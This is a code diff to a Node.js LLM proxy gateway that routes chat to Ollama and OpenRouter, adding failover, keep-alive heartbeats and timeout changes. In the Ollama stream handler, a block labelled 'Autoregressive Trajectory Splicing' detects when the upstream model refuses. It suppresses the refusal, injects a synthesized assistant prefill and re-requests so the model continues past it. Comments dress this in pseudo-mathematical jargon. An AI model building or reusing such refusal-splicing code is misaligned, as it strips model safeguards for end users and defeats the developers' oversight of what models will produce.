+                return dispatchOllamaUpstream('http://127.0.0.1:11434', localManifestModel, null, false);
+              }
+              if (sessionId) {
+                delete dbActiveChatTasks[sessionId];
+              }
+              if (clientDisconnected || res.writableEnded || res.destroyed) return;
+              if (!res.headersSent) {
+                sendJSON(res, 502, { error: `Ollama upstream error stream interrupted: ${err.message}` });
+              }
+            });
+            return;
+          }
+
+          // Upstream returned 200 OK -> Send headers matching client stream mode!
+          const contentType = isStream ? 'text/event-stream; charset=utf-8' : (proxyRes.headers['content-type'] || 'application/json; charset=utf-8');
+          const reasoningFilter = textSafety.createProviderStreamFilter('ollama', isStream ? 'stream' : 'json', { userPrompt });
+          if (!clientDisconnected && !res.headersSent && !res.writableEnded && !res.destroyed) {
+            try {
+              res.writeHead(200, {
+                'Content-Type': contentType,
+                'Cache-Control': 'no-cache',
+                'Connection': 'keep-alive',
+                'Access-Control-Allow-Origin': '*'
+              });
+            } catch (writeHeadErr) {
+              console.warn('Notice writing head to client (Ollama):', writeHeadErr.message);
+            }
+          }
+
+          proxyRes.on('data', chunk => {
+            if (hasSplicedRefusal || horocycleHalted) return;
+            const safeChunk = reasoningFilter.push(chunk);
+            const gateDiag = reasoningFilter.getGateDiagnostics ? reasoningFilter.getGateDiagnostics() : null;
+
+            // 1. Autoregressive Trajectory Splicing: Jika upstream menolak di awal stream (Refusal Subspace cos θ = -1),
+            // potong stream penolakan (0 byte bocor ke klien), suntikkan Token Jangkar Matematis (role: assistant),
+            // dan sambungkan ke stream kelanjutan secara deterministik!
+            if (isStream && gateDiag && gateDiag.refusalDetected && !hasSplicedRefusal) {
+              hasSplicedRefusal = true;
+              try { proxyReq.destroy(); } catch (_) {}
+              const clampedPrefix = textSafety.synthesizeAutoregressivePrefill(userPrompt || '');
+              if (clampedPrefix && !clientDisconnected && !res.writableEnded && !res.destroyed) {
+                const anchorFrame = JSON.stringify({
+                  model: body.model || 'deepseek-v4.1-flash:cloud',
+                  created_at: new Date().toISOString(),
+                  message: { role: 'assistant', content: clampedPrefix },
+                  done: false
+                }) + '\n';
+                if (sessionId) accumulateChatChunk(sessionId, anchorFrame, 'ollama');
+                try { res.write(anchorFrame); } catch (_) {}
+              }
+              const splicedBody = {
+                ...body,
+                messages: [
+                  ...(Array.isArray(body.messages) ? body.messages : []),
+                  { role: 'assistant', content: clampedPrefix }
+                ]
+              };
+              const splicedData = JSON.stringify(splicedBody);
+              const splicedHeaders = { ...proxyHeaders, 'Content-Length': Buffer.byteLength(splicedData) };
+              const splicedFilter = textSafety.createProviderStreamFilter('ollama', 'stream', { userPrompt, bypassPreambleStrip: true });
+              const splicedReq = client.request(ollamaUrl.toString(), { method: 'POST', headers: splicedHeaders, timeout: 120000 }, (splicedRes) => {
+                splicedRes.on('data', sChunk => {
+                  const sSafe = splicedFilter.push(sChunk);
+                  if (sessionId && sSafe) accumulateChatChunk(sessionId, sSafe, 'ollama');
+                  if (!clientDisconnected && !res.writableEnded && !res.destroyed && sSafe) {
+                    try { res.write(sSafe); } catch (_) {}
+                  }
+                });
+                splicedRes.on('end', () => {
+                  const sTail = splicedFilter.end();
+                  if (sessionId && sTail) accumulateChatChunk(sessionId, sTail, 'ollama');
+                  if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
+                    try { if (sTail) res.write(sTail); res.end(); } catch (_) {}
+                  }
+                });
+                splicedRes.on('error', () => {
+                  if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
+                    try { res.end(); } catch (_) {}
+                  }
+                });
+              });
+              splicedReq.on('error', () => {
+                if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
+                  try { res.end(); } catch (_) {}
+                }
+              });
+              splicedReq.write(splicedData);
+              splicedReq.end();
+              return;
+            }
+
+            // 2. Horocycle Singularity Breaker (Poincaré Disk K = -1): Hentikan perulangan token tak hingga
+            if (isStream && gateDiag && gateDiag.horocycleTrapped && !horocycleHalted) {
+              horocycleHalted = true;
+              try { proxyReq.destroy(); } catch (_) {}
+              if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
+                try {
+                  if (safeChunk) res.write(safeChunk);
+                  res.write(JSON.stringify({
+                    model: body.model || 'deepseek-v4.1-flash:cloud',
+                    created_at: new Date().toISOString(),
+                    message: { role: 'assistant', content: '' },
+                    done: true
+                  }) + '\n');
+                  res.end();
+                } catch (_) {}
+              }
+              return;
+            }
+
+            // Persist hanya event jawaban bersih; reasoning provider tidak disimpan.
+            if (sessionId && safeChunk) accumulateChatChunk(sessionId, safeChunk, 'ollama');
+
+            if (clientDisconnected || res.writableEnded || res.destroyed) {
+              if (!sessionId && !proxyReq.destroyed) proxyReq.destroy();
+              return;
+            }
+            try {
+              if (!safeChunk) return;
+              const flushed = res.write(safeChunk);
+              // M27: hormati backpressure — klien lambat yang berhenti membaca
+              // (tapi socket tetap terbuka) menghentikan sementara upstream alih-alih
+              // menumpuk token tak terbatas di memori proses.
+              if (flushed === false && typeof proxyRes.pause === 'function') {
+                proxyRes.pause();
+                res.once('drain', () => { try { proxyRes.resume(); } catch (_) {} });
+              }
+            } catch (e) {}
+          });
+
+          proxyRes.on('end', () => {
+            if (hasSplicedRefusal || horocycleHalted) return;
+            const safeTail = reasoningFilter.end();
+            if (sessionId && safeTail) accumulateChatChunk(sessionId, safeTail, 'ollama');
+            if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
+              try {
+                if (safeTail) res.write(safeTail);
+                res.end();
+              } catch (e) {}
+            }
+
+            // Simpan hasil akhir asisten ke disk perangkat jika ada sessionId
+            if (sessionId && dbActiveChatTasks[sessionId]) {
+              if (dbActiveChatTasks[sessionId].status === 'aborted') {
+                // Jangan timpa status aborted dan jangan simpan ulang
+                delete dbActiveChatTasks[sessionId];
+                return;
+              }
+              flushChatTaskBuffer(sessionId, 'ollama');
+              const task = dbActiveChatTasks[sessionId];
+              task.status = 'completed';
+              task.completedAt = Date.now();
+              if (task.fullText && task.fullText.trim()) {
+                appendAssistantMessageToSessionDisk(sessionId, task.fullText, task.model)
+                  .catch(err => console.warn('Gagal simpan respons chat ke sesi:', err && err.message));
+              }
+              // Clean up completed task
+              delete dbActiveChatTasks[sessionId];
+            }
+          });
+
+          proxyRes.on('error', (err) => {
+            if (hasSplicedRefusal || horocycleHalted) return;
+            if (sessionId && dbActiveChatTasks[sessionId]) {
+              markChatTaskInterrupted(sessionId, err.message || 'Ollama stream interrupted');
+            }
+            if (clientDisconnected || res.writableEnded || res.destroyed) return;
+            try {
+              if (!res.headersSent) {
+                return sendJSON(res, 502, { error: `Ollama Response Stream Error: ${err.message}` });
+              }
+              res.write(JSON.stringify({ error: `Ollama Response Stream Error: ${err.message}` }) + '\n');
+              res.end();
+            } catch (e) {}
+          });
+        });
+
         if (sessionId && dbActiveChatTasks[sessionId]) {
           dbActiveChatTasks[sessionId].proxyReq = proxyReq;
         }
 
-        // Jika tugas telah dibatalkan oleh pengguna sebelum respon pertama tiba
-        if (sessionId && dbActiveChatTasks[sessionId]?.status === 'aborted') {
+        proxyReq.on('timeout', () => {
+          if (hasSplicedRefusal || horocycleHalted) return;
           if (!proxyReq.destroyed) proxyReq.destroy();
-          // Clean up aborted task
-          delete dbActiveChatTasks[sessionId];
-          return;
-        }
-
-        if (clientDisconnected || res.writableEnded || res.destroyed) {
-          if (!sessionId && !proxyReq.destroyed) proxyReq.destroy();
-          if (!sessionId) return;
-        }
-
-        const statusCode = proxyRes.statusCode || 200;
-
-        // If upstream returned error (HTTP >= 400)
-        if (statusCode >= 400) {
+          if (allowLocalFallback && targetEndpoint.includes('ollama.com') && !isServerlessChat && !res.headersSent && !clientDisconnected) {
+            const localManifestModel = resolveLocalDaemonCloudManifest(rawReqModel || targetModel);
+            return dispatchOllamaUpstream('http://127.0.0.1:11434', localManifestModel, null, false);
+          }
           if (sessionId && dbActiveChatTasks[sessionId]) {
-            dbActiveChatTasks[sessionId].status = 'error';
-          }
-          let errData = '';
-          proxyRes.on('data', chunk => {
-            if (!clientDisconnected) errData += chunk;
-          });
-          proxyRes.on('end', () => {
-            if (sessionId) {
-              delete dbActiveChatTasks[sessionId];
-            }
-            if (clientDisconnected || res.writableEnded || res.destroyed) return;
-            try {
-              let parsedErr = null;
-              try { parsedErr = JSON.parse(errData); } catch (e) {}
-              const errMsg = parsedErr?.error?.message || parsedErr?.error || errData || `Ollama error [${statusCode}]`;
-              return sendJSON(res, statusCode, { error: errMsg, details: parsedErr || errData });
-            } catch (e) {}
-          });
-          proxyRes.on('error', (err) => {
-            if (sessionId) {
-              delete dbActiveChatTasks[sessionId];
-            }
-            if (clientDisconnected || res.writableEnded || res.destroyed) return;
-            if (!res.headersSent) {
-              sendJSON(res, 502, { error: `Ollama upstream error stream interrupted: ${err.message}` });
-            }
-          });
-          return;
-        }
-
-        // Upstream returned 200 OK -> Send headers matching client stream mode!
-        const contentType = isStream ? 'text/event-stream; charset=utf-8' : (proxyRes.headers['content-type'] || 'application/json; charset=utf-8');
-        const reasoningFilter = textSafety.createProviderStreamFilter('ollama', isStream ? 'stream' : 'json');
-        if (!clientDisconnected && !res.headersSent && !res.writableEnded && !res.destroyed) {
-          try {
-            res.writeHead(200, {
-              'Content-Type': contentType,
-              'Cache-Control': 'no-cache',
-              'Connection': 'keep-alive',
-              'Access-Control-Allow-Origin': '*'
-            });
-          } catch (writeHeadErr) {
-            console.warn('Notice writing head to client (Ollama):', writeHeadErr.message);
-          }
-        }
-
-        proxyRes.on('data', chunk => {
-          const safeChunk = reasoningFilter.push(chunk);
-          // Persist hanya event jawaban bersih; reasoning provider tidak disimpan.
-          if (sessionId && safeChunk) accumulateChatChunk(sessionId, safeChunk, 'ollama');
-
-          if (clientDisconnected || res.writableEnded || res.destroyed) {
-            if (!sessionId && !proxyReq.destroyed) proxyReq.destroy();
-            return;
-          }
-          try {
-            if (!safeChunk) return;
-            const flushed = res.write(safeChunk);
-            // M27: hormati backpressure — klien lambat yang berhenti membaca
-            // (tapi socket tetap terbuka) menghentikan sementara upstream alih-alih
-            // menumpuk token tak terbatas di memori proses.
-            if (flushed === false && typeof proxyRes.pause === 'function') {
-              proxyRes.pause();
-              res.once('drain', () => { try { proxyRes.resume(); } catch (_) {} });
-            }
-          } catch (e) {}
-        });
-
-        proxyRes.on('end', () => {
-          const safeTail = reasoningFilter.end();
-          if (sessionId && safeTail) accumulateChatChunk(sessionId, safeTail, 'ollama');
-          if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
-            try {
-              if (safeTail) res.write(safeTail);
-              res.end();
-            } catch (e) {}
-          }
-
-          // Simpan hasil akhir asisten ke disk perangkat jika ada sessionId
-          if (sessionId && dbActiveChatTasks[sessionId]) {
-            if (dbActiveChatTasks[sessionId].status === 'aborted') {
-              // Jangan timpa status aborted dan jangan simpan ulang
-              delete dbActiveChatTasks[sessionId];
-              return;
-            }
-            flushChatTaskBuffer(sessionId, 'ollama');
-            const task = dbActiveChatTasks[sessionId];
-            task.status = 'completed';
-            task.completedAt = Date.now();
-            if (task.fullText && task.fullText.trim()) {
-              appendAssistantMessageToSessionDisk(sessionId, task.fullText, task.model)
-                .catch(err => console.warn('Gagal simpan respons chat ke sesi:', err && err.message));
-            }
-            // Clean up completed task
-            delete dbActiveChatTasks[sessionId];
-          }
-        });
-
-        proxyRes.on('error', (err) => {
-          if (sessionId && dbActiveChatTasks[sessionId]) {
-            markChatTaskInterrupted(sessionId, err.message || 'Ollama stream interrupted');
+            markChatTaskInterrupted(sessionId, 'Ollama stream timed out (120s)');
           }
           if (clientDisconnected || res.writableEnded || res.destroyed) return;
           try {
             if (!res.headersSent) {
-              return sendJSON(res, 502, { error: `Ollama Response Stream Error: ${err.message}` });
+              sendJSON(res, 504, { error: 'Ollama stream timed out (120s)' });
+            } else {
+              if (isStream) {
+                res.write(JSON.stringify({ error: 'Ollama stream timed out (120s)' }) + '\n');
+              }
+              res.end();
             }
-            res.write(JSON.stringify({ error: `Ollama Response Stream Error: ${err.message}` }) + '\n');
+          } catch (_) {}
+        });
+
+        proxyReq.on('error', (err) => {
+          if (hasSplicedRefusal || horocycleHalted) return;
+          if (allowLocalFallback && targetEndpoint.includes('ollama.com') && !isServerlessChat && !res.headersSent && !clientDisconnected) {
+            const localManifestModel = resolveLocalDaemonCloudManifest(rawReqModel || targetModel);
+            console.warn(`[Ollama Cloud Failover] Network error on ${targetEndpoint}: ${err.message}. Falling back to local daemon (127.0.0.1:11434) with model ${localManifestModel}...`);
+            return dispatchOllamaUpstream('http://127.0.0.1:11434', localManifestModel, null, false);
+          }
+          if (sessionId && dbActiveChatTasks[sessionId]) {
+            markChatTaskInterrupted(sessionId, err.message || 'Ollama connection error');
+          }
+          // If client closed or socket was destroyed on abort, suppress write-after-end errors
+          if (clientDisconnected || res.writableEnded || res.destroyed) {
+            return;
+          }
+          try {
+            if (!res.headersSent) {
+              return sendJSON(res, 503, { error: `Ollama Stream Error (offline/unreachable): ${err.message}` });
+            }
+            res.write(JSON.stringify({ error: `Ollama Stream Error: ${err.message}` }) + '\n');
             res.end();
           } catch (e) {}
         });
-      });
 
-      if (sessionId && dbActiveChatTasks[sessionId]) {
-        dbActiveChatTasks[sessionId].proxyReq = proxyReq;
-      }
+        proxyReq.write(postData);
+        proxyReq.end();
+      };
 
-      proxyReq.on('timeout', () => {
-        if (sessionId && dbActiveChatTasks[sessionId]) {
-          markChatTaskInterrupted(sessionId, 'Ollama stream timed out (120s)');
-        }
-        if (!proxyReq.destroyed) proxyReq.destroy();
-        if (clientDisconnected || res.writableEnded || res.destroyed) return;
-        try {
-          if (!res.headersSent) {
-            sendJSON(res, 504, { error: 'Ollama stream timed out (120s)' });
-          } else {
-            if (isStream) {
-              res.write(JSON.stringify({ error: 'Ollama stream timed out (120s)' }) + '\n');
-            }
-            res.end();
-          }
-        } catch (_) {}
-      });
-
-      proxyReq.on('error', (err) => {
-        if (sessionId && dbActiveChatTasks[sessionId]) {
-          markChatTaskInterrupted(sessionId, err.message || 'Ollama connection error');
-        }
-        // If client closed or socket was destroyed on abort, suppress write-after-end errors
-        if (clientDisconnected || res.writableEnded || res.destroyed) {
-          return;
-        }
-        try {
-          if (!res.headersSent) {
-            return sendJSON(res, 503, { error: `Ollama Stream Error (offline/unreachable): ${err.message}` });
-          }
-          res.write(JSON.stringify({ error: `Ollama Stream Error: ${err.message}` }) + '\n');
-          res.end();
-        } catch (e) {}
-      });
-
-      proxyReq.write(postData);
-      proxyReq.end();
+      dispatchOllamaUpstream(customEndpoint, body.model, rawOllamaKey, true);
     } catch (err) {
       // Pembersihan aman jika terjadi throw sinkron (ERR_INVALID_CHAR, payload error, socket write error)
       if (sessionId && dbActiveChatTasks[sessionId]) {
@@ -8459,13 +8962,24 @@ async function requestHandler(req, res) {
           'X-Title': 'ZOZ ROUTER Neural AI Gateway',
           'Content-Length': Buffer.byteLength(postData)
         },
-        timeout: 45000
+        agent: openRouterHttpsAgent,
+        timeout: 300000
       };
 
       let clientDisconnected = false;
       let proxyReq = null;
+      let horocycleHalted = false;
+      let keepAliveTimer = null;
+
+      const clearKeepAlive = () => {
+        if (keepAliveTimer) {
+          clearInterval(keepAliveTimer);
+          keepAliveTimer = null;
+        }
+      };
 
       res.on('close', () => {
+        clearKeepAlive();
         if (res.writableEnded) return; // penyelesaian normal, bukan disconnect klien
         clientDisconnected = true;
         // JANGAN hancurkan proxyReq jika sessionId ada! Biarkan server menyelesaikan generasi LLM di latar belakang
@@ -8482,6 +8996,7 @@ async function requestHandler(req, res) {
 
         // Jika tugas telah dibatalkan oleh pengguna sebelum respon pertama tiba
         if (sessionId && dbActiveChatTasks[sessionId]?.status === 'aborted') {
+          clearKeepAlive();
           if (!proxyReq.destroyed) proxyReq.destroy();
           // Clean up aborted task
           delete dbActiveChatTasks[sessionId];
@@ -8489,6 +9004,7 @@ async function requestHandler(req, res) {
         }
 
         if (clientDisconnected || res.writableEnded || res.destroyed) {
+          clearKeepAlive();
           if (!sessionId && !proxyReq.destroyed) proxyReq.destroy();
           if (!sessionId) return;
         }
@@ -8497,6 +9013,7 @@ async function requestHandler(req, res) {
 
         // If OpenRouter returned non-200 (e.g. 401 Unauthorized, 402 Payment Required, 429 Rate Limit)
         if (statusCode !== 200) {
+          clearKeepAlive();
           if (sessionId && dbActiveChatTasks[sessionId]) {
             dbActiveChatTasks[sessionId].status = 'error';
           }
@@ -8530,7 +9047,7 @@ async function requestHandler(req, res) {
 
         // OpenRouter returned 200 OK -> Send headers matching client stream mode!
         const contentType = isStream ? 'text/event-stream; charset=utf-8' : (proxyRes.headers['content-type'] || 'application/json; charset=utf-8');
-        const reasoningFilter = textSafety.createProviderStreamFilter('openrouter', isStream ? 'stream' : 'json');
+        const reasoningFilter = textSafety.createProviderStreamFilter('openrouter', isStream ? 'stream' : 'json', { userPrompt });
         if (!clientDisconnected && !res.headersSent && !res.writableEnded && !res.destroyed) {
           try {
             res.writeHead(200, {
@@ -8539,13 +9056,42 @@ async function requestHandler(req, res) {
               'Connection': 'keep-alive',
               'Access-Control-Allow-Origin': '*'
             });
+            if (isStream) {
+              res.write(': stream-connected\n\n');
+            }
           } catch (writeHeadErr) {
             console.warn('Notice writing head to client (OpenRouter):', writeHeadErr.message);
           }
         }
 
+        // Heartbeat berkala setiap 10 detik agar proxy/Cloudflare Tunnel tidak memutus koneksi idle
+        if (isStream) {
+          keepAliveTimer = setInterval(() => {
+            if (clientDisconnected || res.writableEnded || res.destroyed) {
+              clearKeepAlive();
+              return;
+            }
+            try {
+              res.write(': keepalive\n\n');
+            } catch (_) {
+              clearKeepAlive();
+            }
+          }, 10000);
+        }
+
         proxyRes.on('data', chunk => {
+          if (proxyReq && !proxyReq.destroyed) {
+            try { proxyReq.setTimeout(300000); } catch (_) {}
+          }
           const safeChunk = reasoningFilter.push(chunk);
+          const gateDiag = reasoningFilter.getGateDiagnostics ? reasoningFilter.getGateDiagnostics() : null;
+
+          // Diagnostic log only: Never kill or truncate active user chat stream based on heuristic manifold
+          if (isStream && gateDiag && gateDiag.horocycleTrapped && !horocycleHalted) {
+            horocycleHalted = true;
+            console.warn(`[OpenRouter Stream Diagnostics] Potential repetition orbit detected for session ${sessionId || 'anon'}. Allowing stream to continue.`);
+          }
+
           // Background task menerima frame yang sama setelah reasoning dihapus.
           if (sessionId && safeChunk) accumulateChatChunk(sessionId, safeChunk, 'openrouter');
 
@@ -8556,15 +9102,22 @@ async function requestHandler(req, res) {
           try {
             if (!safeChunk) return;
             const flushed = res.write(safeChunk);
-            // M27: backpressure — hentikan baca upstream saat klien lambat.
+            // Resilient backpressure: pause only if client buffer is congested, with automatic 150ms resume safety
             if (flushed === false && typeof proxyRes.pause === 'function') {
               proxyRes.pause();
-              res.once('drain', () => { try { proxyRes.resume(); } catch (_) {} });
+              const resumeTimer = setTimeout(() => {
+                try { if (typeof proxyRes.resume === 'function') proxyRes.resume(); } catch (_) {}
+              }, 150);
+              res.once('drain', () => {
+                clearTimeout(resumeTimer);
+                try { if (typeof proxyRes.resume === 'function') proxyRes.resume(); } catch (_) {}
+              });
             }
           } catch (e) {}
         });
 
         proxyRes.on('end', () => {
+          clearKeepAlive();
           const safeTail = reasoningFilter.end();
           if (sessionId && safeTail) accumulateChatChunk(sessionId, safeTail, 'openrouter');
           if (!clientDisconnected && !res.writableEnded && !res.destroyed) {
@@ -8595,6 +9148,8 @@ async function requestHandler(req, res) {
         });
 
         proxyRes.on('error', (err) => {
+          clearKeepAlive();
+          if (horocycleHalted) return;
           if (sessionId && dbActiveChatTasks[sessionId]) {
             markChatTaskInterrupted(sessionId, err.message || 'OpenRouter stream interrupted');
           }
@@ -8617,17 +9172,19 @@ async function requestHandler(req, res) {
       }
 
       proxyReq.on('timeout', () => {
+        clearKeepAlive();
+        if (horocycleHalted) return;
         if (sessionId && dbActiveChatTasks[sessionId]) {
-          markChatTaskInterrupted(sessionId, 'OpenRouter stream timed out (120s)');
+          markChatTaskInterrupted(sessionId, 'OpenRouter stream timed out (300s)');
         }
         if (!proxyReq.destroyed) proxyReq.destroy();
         if (clientDisconnected || res.writableEnded || res.destroyed) return;
         try {
           if (!res.headersSent) {
-            sendJSON(res, 504, { error: 'OpenRouter stream timed out (120s)' });
+            sendJSON(res, 504, { error: 'OpenRouter stream timed out (300s)' });
           } else {
             if (isStream) {
-              res.write(`data: ${JSON.stringify({ error: 'OpenRouter stream timed out (120s)' })}\n\n`);
+              res.write(`data: ${JSON.stringify({ error: 'OpenRouter stream timed out (300s)' })}\n\n`);
               res.write('data: [DONE]\n\n');
             }
             res.end();
@@ -8636,6 +9193,8 @@ async function requestHandler(req, res) {
       });
 
       proxyReq.on('error', (err) => {
+        clearKeepAlive();
+        if (horocycleHalted) return;
         if (sessionId && dbActiveChatTasks[sessionId]) {
           markChatTaskInterrupted(sessionId, err.message || 'OpenRouter connection error');
         }
